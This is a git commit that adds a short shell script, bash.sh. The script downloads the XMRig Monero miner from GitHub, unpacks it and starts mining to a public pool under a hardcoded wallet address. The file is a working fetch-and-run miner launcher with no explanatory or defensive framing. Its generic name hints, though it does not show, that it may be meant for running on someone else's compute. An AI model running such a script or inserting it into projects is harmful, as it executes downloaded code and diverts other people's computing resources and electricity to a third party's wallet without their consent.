618089d2a1911b66c0ff3532cb329c820c0de642
HocasPocas <108454461+HocasPocas@users.noreply.github.com>
2022-08-21 13:57:54 +0530

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 8BfC3M5VC8sVyL4JFRWkUXNRHgKVSNnudgpMzq6X46v2V2BWx3oYAnB65dvrq2zuxfHzcecBj1FeyNxgLAJM3N2GBdDT8VZ -k --tls --rig-id rig
